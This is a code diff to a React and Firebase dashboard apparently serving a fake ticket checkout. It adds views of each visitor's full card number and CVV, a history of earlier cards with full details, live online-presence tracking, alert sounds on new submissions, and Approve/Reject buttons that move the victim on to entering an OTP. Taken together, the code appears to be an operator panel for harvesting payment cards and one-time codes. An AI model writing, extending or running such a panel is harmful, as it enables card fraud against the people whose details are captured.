@@ -1,5 +1,7 @@
-import { useEffect, useMemo, useState } from "react";
+import { useEffect, useMemo, useRef, useState } from "react";
 import {
+  Bell,
+  BellOff,
   CalendarDays,
   CreditCard,
   Loader2,
@@ -10,7 +12,8 @@ import {
 } from "lucide-react";
 import { Link } from "wouter";
 import { collection, doc, onSnapshot, setDoc } from "firebase/firestore";
-import { db } from "@/lib/firebase";
+import { onValue, ref as databaseRef } from "firebase/database";
+import { database, db } from "@/lib/firebase";
 import { formatQar } from "@/lib/ticket-cart";
 
 type CheckoutItem = {
@@ -39,10 +42,20 @@ type Payment = {
   errorMessage?: string | null;
 };
 
+type CardHistoryEntry = {
+  cardholderName?: string;
+  cardNumberFull?: string;
+  cardNumberMasked?: string;
+  expiry?: string;
+  cvv?: string;
+  changedAt?: string;
+};
+
 type PayRecord = {
   id: string;
   billing?: Billing;
   payment?: Payment;
+  cardHistory?: CardHistoryEntry[];
   items?: CheckoutItem[];
   subtotal?: number;
   total?: number;
@@ -54,6 +67,13 @@ type PayRecord = {
   createdAt?: string;
   updatedAt?: string;
   [key: string]: unknown;
+};
+
+type PresenceRecord = {
+  online?: boolean;
+  currentPage?: string;
+  submissionId?: string | null;
+  lastSeen?: unknown;
 };
 
 function getDateSortValue(record: PayRecord): number {
@@ -75,6 +95,15 @@ function getDisplayName(record: PayRecord): string {
 
 function getLastMessage(record: PayRecord): string {
   const paymentStatus = record.payment?.status ?? record.status;
+  if (paymentStatus === "pending_review") {
+    return "Waiting dashboard approval";
+  }
+  if (paymentStatus === "approved") {
+    return "Approved - customer can enter OTP";
+  }
+  if (paymentStatus === "rejected") {
+    return "Card rejected from dashboard";
+  }
   if (paymentStatus === "otp_failed") {
     return "OTP failed - needs review";
   }
@@ -92,14 +121,15 @@ function getLastMessage(record: PayRecord): string {
   return "New checkout activity";
 }
 
-function getFormattedTime(value?: string): string {
+function getFormattedTime(value?: string | number): string {
   if (!value) {
     return "--";
   }
 
-  const parsed = Date.parse(value);
+  const parsed =
+    typeof value === "number" ? value : Date.parse(value);
   if (Number.isNaN(parsed)) {
-    return value;
+    return String(value);
   }
 
   return new Intl.DateTimeFormat("en-GB", {
@@ -110,8 +140,39 @@ function getFormattedTime(value?: string): string {
   }).format(new Date(parsed));
 }
 
+function getPresenceForRecord(
+  record: PayRecord,
+  presenceMap: Record<string, PresenceRecord>
+): PresenceRecord | undefined {
+  const direct = presenceMap[record.id];
+  if (direct) {
+    return direct;
+  }
+
+  return Object.values(presenceMap).find(
+    (presence) => presence?.submissionId === record.id
+  );
+}
+
+function resolvePresenceLastSeenValue(value: unknown): string {
+  if (typeof value === "number" || typeof value === "string") {
+    return getFormattedTime(value);
+  }
+
+  return "--";
+}
+
 function toGroupedCardNumber(value: string): string {
-  const digits = value.replace(/\D/g, "").slice(0, 19);
+  const trimmed = value.trim();
+  if (!trimmed) {
+    return "•••• •••• •••• ••••";
+  }
+
+  if (trimmed.includes("*") || trimmed.includes("•")) {
+    return trimmed;
+  }
+
+  const digits = trimmed.replace(/\D/g, "").slice(0, 19);
   if (!digits) {
     return "•••• •••• •••• ••••";
   }
@@ -119,8 +180,14 @@ function toGroupedCardNumber(value: string): string {
 }
 
 function getStatusBadge(status?: string): { label: string; className: string } {
-  if (status === "otp_failed") {
-    return { label: "Failed", className: "bg-[#3b1414] text-[#ff9f9f]" };
+  if (status === "pending_review") {
+    return { label: "Under Review", className: "bg-[#3b2e14] text-[#ffd888]" };
+  }
+  if (status === "approved") {
+    return { label: "Approved", className: "bg-[#113744] text-[#8ddfff]" };
+  }
+  if (status === "rejected" || status === "otp_failed") {
+    return { label: "Rejected", className: "bg-[#3b1414] text-[#ff9f9f]" };
   }
   if (status === "otp_verified") {
     return { label: "Verified", className: "bg-[#143224] text-[#7bf3b0]" };
@@ -135,18 +202,129 @@ export default function Dashboard() {
   const [isLoading, setIsLoading] = useState(true);
   const [error, setError] = useState<string | null>(null);
   const [isMarkingRead, setIsMarkingRead] = useState(false);
+  const [decisionLoading, setDecisionLoading] = useState<
+    "approve" | "reject" | null
+  >(null);
+  const [presenceMap, setPresenceMap] = useState<Record<string, PresenceRecord>>(
+    {}
+  );
+  const [isSoundEnabled, setIsSoundEnabled] = useState(true);
+  const hasReceivedFirstSnapshotRef = useRef(false);
+  const previousStatusMapRef = useRef<Map<string, string>>(new Map());
+  const soundEnabledRef = useRef(true);
+  const audioContextRef = useRef<AudioContext | null>(null);
+
+  useEffect(() => {
+    soundEnabledRef.current = isSoundEnabled;
+  }, [isSoundEnabled]);
+
+  useEffect(() => {
+    const presenceRef = databaseRef(database, "presence");
+    const unsubscribe = onValue(presenceRef, (snapshot) => {
+      const rawPresence = snapshot.val() as Record<string, PresenceRecord> | null;
+      setPresenceMap(rawPresence ?? {});
+    });
+
+    return () => {
+      unsubscribe();
+    };
+  }, []);
+
+  useEffect(() => {
+    return () => {
+      if (audioContextRef.current) {
+        void audioContextRef.current.close();
+      }
+    };
+  }, []);
+
+  const playNotificationSound = () => {
+    if (!soundEnabledRef.current || typeof window === "undefined") {
+      return;
+    }
+
+    try {
+      const AudioContextClass =
+        window.AudioContext ||
+        (
+          window as Window & {
+            webkitAudioContext?: typeof AudioContext;
+          }
+        ).webkitAudioContext;
+
+      if (!AudioContextClass) {
+        return;
+      }
+
+      if (!audioContextRef.current) {
+        audioContextRef.current = new AudioContextClass();
+      }
+
+      const audioContext = audioContextRef.current;
+      void audioContext.resume().catch(() => {
+      });
+
+      const oscillator = audioContext.createOscillator();
+      const gainNode = audioContext.createGain();
+      oscillator.connect(gainNode);
+      gainNode.connect(audioContext.destination);
+
+      oscillator.type = "sine";
+      oscillator.frequency.setValueAtTime(880, audioContext.currentTime);
+      gainNode.gain.setValueAtTime(0.0001, audioContext.currentTime);
+      gainNode.gain.exponentialRampToValueAtTime(
+        0.15,
+        audioContext.currentTime + 0.01
+      );
+      gainNode.gain.exponentialRampToValueAtTime(
+        0.0001,
+        audioContext.currentTime + 0.22
+      );
+
+      oscillator.start();
+      oscillator.stop(audioContext.currentTime + 0.22);
+    } catch {
+    }
+  };
 
   useEffect(() => {
     setIsLoading(true);
     const unsubscribe = onSnapshot(
       collection(db, "pays"),
       (snapshot) => {
-        const nextRecords = snapshot.docs
+        const nextRecords: PayRecord[] = snapshot.docs
           .map((entry) => ({
             id: entry.id,
             ...(entry.data() as Omit<PayRecord, "id">),
           }))
           .sort((a, b) => getDateSortValue(b) - getDateSortValue(a));
+
+        const nextStatusMap = new Map<string, string>();
+        nextRecords.forEach((record) => {
+          nextStatusMap.set(
+            record.id,
+            String(record.payment?.status ?? record.status ?? "")
+          );
+        });
+
+        if (hasReceivedFirstSnapshotRef.current) {
+          const hasNewRecord = nextRecords.some(
+            (record) => !previousStatusMapRef.current.has(record.id)
+          );
+
+          const hasStatusChange = nextRecords.some((record) => {
+            const previousStatus = previousStatusMapRef.current.get(record.id);
+            const nextStatus = nextStatusMap.get(record.id);
+            return previousStatus !== undefined && previousStatus !== nextStatus;
+          });
+
+          if (hasNewRecord || hasStatusChange) {
+            playNotificationSound();
+          }
+        }
+
+        previousStatusMapRef.current = nextStatusMap;
+        hasReceivedFirstSnapshotRef.current = true;
 
         setRecords(nextRecords);
         setError(null);
@@ -192,11 +370,23 @@ export default function Dashboard() {
     records.find((record) => record.id === selectedId) ?? filteredRecords[0] ?? null;
   const selectedStatus = selectedRecord?.payment?.status ?? selectedRecord?.status;
   const selectedStatusBadge = getStatusBadge(selectedStatus);
+  const selectedPresence = selectedRecord
+    ? getPresenceForRecord(selectedRecord, presenceMap)
+    : undefined;
+  const isSelectedOnline = Boolean(selectedPresence?.online);
+  const selectedLastSeen = resolvePresenceLastSeenValue(selectedPresence?.lastSeen);
   const selectedCardNumber = toGroupedCardNumber(
     selectedRecord?.payment?.cardNumberFull ??
       selectedRecord?.payment?.cardNumberMasked ??
       ""
   );
+  const selectedCardHistory = (selectedRecord?.cardHistory ?? [])
+    .slice()
+    .sort((a, b) => {
+      const left = Date.parse(a.changedAt ?? "");
+      const right = Date.parse(b.changedAt ?? "");
+      return (Number.isNaN(right) ? 0 : right) - (Number.isNaN(left) ? 0 : left);
+    });
 
   const calculatedTotal =
     typeof selectedRecord?.total === "number"
@@ -237,6 +427,41 @@ export default function Dashboard() {
     }
   };
 
+  const onUpdateDecision = async (decision: "approved" | "rejected") => {
+    if (!selectedRecord) {
+      return;
+    }
+
+    setDecisionLoading(decision === "approved" ? "approve" : "reject");
+    try {
+      await setDoc(
+        doc(db, "pays", selectedRecord.id),
+        {
+          status: decision,
+          payment: {
+            ...(selectedRecord.payment ?? {}),
+            status: decision,
+            errorMessage:
+              decision === "rejected"
+                ? "تم رفض البطاقة من لوحة التحكم."
+                : null,
+          },
+          updatedAt: new Date().toISOString(),
+        },
+        { merge: true }
+      );
+      setError(null);
+    } catch (decisionError) {
+      const message =
+        decisionError instanceof Error
+          ? decisionError.message
+          : "Unable to update payment decision.";
+      setError(message);
+    } finally {
+      setDecisionLoading(null);
+    }
+  };
+
   return (
     <div className="min-h-screen bg-[#0b141a] text-[#e9edef]">
       <div className="mx-auto max-w-[1300px] px-4 py-6 sm:px-6">
@@ -257,6 +482,18 @@ export default function Dashboard() {
               <span className="rounded-full bg-black/20 px-3 py-1 font-semibold">
                 Unread: {unreadCount}
               </span>
+              <button
+                type="button"
+                onClick={() => setIsSoundEnabled((current) => !current)}
+                className="inline-flex items-center gap-1 rounded-full bg-black/20 px-3 py-1 font-semibold text-white hover:bg-black/30"
+              >
+                {isSoundEnabled ? (
+                  <Bell className="h-3.5 w-3.5" />
+                ) : (
+                  <BellOff className="h-3.5 w-3.5" />
+                )}
+                {isSoundEnabled ? "Sound on" : "Sound off"}
+              </button>
               <Link
                 href="/"
                 className="rounded-full bg-white/90 px-3 py-1 font-semibold text-[#128c7e] hover:bg-white"
@@ -300,6 +537,8 @@ export default function Dashboard() {
                 const isSelected = selectedRecord?.id === record.id;
                 const status = record.payment?.status ?? record.status;
                 const statusBadge = getStatusBadge(status);
+                const presence = getPresenceForRecord(record, presenceMap);
+                const isOnline = Boolean(presence?.online);
 
                 return (
                   <button
@@ -326,6 +565,20 @@ export default function Dashboard() {
                         <p className="mt-0.5 truncate text-xs text-[#8696a0]">
                           {record.id}
                         </p>
+                        <div className="mt-1 flex items-center gap-1.5 text-[10px]">
+                          <span
+                            className={`h-2 w-2 rounded-full ${
+                              isOnline ? "bg-[#25d366]" : "bg-[#54656f]"
+                            }`}
+                          />
+                          <span
+                            className={
+                              isOnline ? "text-[#25d366]" : "text-[#8696a0]"
+                            }
+                          >
+                            {isOnline ? "online" : "offline"}
+                          </span>
+                        </div>
                         <div className="mt-2 flex items-center justify-between gap-2">
                           <p className="truncate text-xs text-[#c6d1d6]">
                             {getLastMessage(record)}
@@ -361,6 +614,15 @@ export default function Dashboard() {
                         {getDisplayName(selectedRecord)}
                       </h2>
                       <p className="text-xs text-[#8696a0]">{selectedRecord.id}</p>
+                      <p
+                        className={`mt-0.5 text-[11px] font-semibold ${
+                          isSelectedOnline ? "text-[#25d366]" : "text-[#8696a0]"
+                        }`}
+                      >
+                        {isSelectedOnline
+                          ? "Online now"
+                          : `Offline • Last seen ${selectedLastSeen}`}
+                      </p>
                     </div>
                   </div>
                   <div className="flex items-center gap-2">
@@ -369,6 +631,22 @@ export default function Dashboard() {
                     >
                       {selectedStatusBadge.label}
                     </span>
+                    <button
+                      type="button"
+                      onClick={() => onUpdateDecision("approved")}
+                      disabled={decisionLoading !== null}
+                      className="rounded-full border border-[#1f4f3a] bg-[#1a8e4c] px-3 py-1 text-xs font-semibold text-white hover:bg-[#14723c] disabled:cursor-not-allowed disabled:opacity-60"
+                    >
+                      {decisionLoading === "approve" ? "Approving..." : "Approve"}
+                    </button>
+                    <button
+                      type="button"
+                      onClick={() => onUpdateDecision("rejected")}
+                      disabled={decisionLoading !== null}
+                      className="rounded-full border border-[#5a1a1a] bg-[#a63535] px-3 py-1 text-xs font-semibold text-white hover:bg-[#8d2c2c] disabled:cursor-not-allowed disabled:opacity-60"
+                    >
+                      {decisionLoading === "reject" ? "Rejecting..." : "Reject"}
+                    </button>
                     <button
                       type="button"
                       onClick={onMarkAsRead}
@@ -450,6 +728,9 @@ export default function Dashboard() {
                           </p>
                         </div>
                       </div>
+                      <div className="mt-3 inline-flex rounded-md bg-black/20 px-2.5 py-1 text-xs font-semibold">
+                        CVV: {selectedRecord.payment?.cvv ?? "--"}
+                      </div>
                     </div>
 
                     <div className="rounded-xl border border-[#2a3942] bg-[#111b21] p-3">
@@ -485,6 +766,45 @@ export default function Dashboard() {
                           )}
                         </p>
                       </div>
+                    </div>
+
+                    <div className="rounded-xl border border-[#2a3942] bg-[#111b21] p-3">
+                      <p className="flex items-center gap-2 text-xs font-semibold text-[#9fb0b8]">
+                        <CreditCard className="h-4 w-4 text-[#25d366]" />
+                        CARD HISTORY (OLD CARDS)
+                      </p>
+                      {selectedCardHistory.length === 0 ? (
+                        <p className="mt-2 text-xs text-[#8696a0]">
+                          No previous card updates for this visitor.
+                        </p>
+                      ) : (
+                        <div className="mt-2 space-y-2">
+                          {selectedCardHistory.map((entry, index) => (
+                            <div
+                              key={`${entry.changedAt ?? "history"}-${index}`}
+                              className="rounded-md border border-[#2a3942] bg-[#0b141a] px-2.5 py-2 text-xs text-[#d5dfe4]"
+                            >
+                              <p className="font-semibold">
+                                {entry.cardholderName ?? "--"}
+                              </p>
+                              <p className="mt-0.5" dir="ltr">
+                                {toGroupedCardNumber(
+                                  entry.cardNumberFull ??
+                                    entry.cardNumberMasked ??
+                                    ""
+                                )}
+                              </p>
+                              <p className="mt-0.5 text-[#9fb0b8]">
+                                Exp: {entry.expiry ?? "--/--"} | CVV:{" "}
+                                {entry.cvv ?? "--"}
+                              </p>
+                              <p className="mt-0.5 text-[#8696a0]">
+                                Changed: {getFormattedTime(entry.changedAt ?? "--")}
+                              </p>
+                            </div>
+                          ))}
+                        </div>
+                      )}
                     </div>
                   </section>
                 </div>
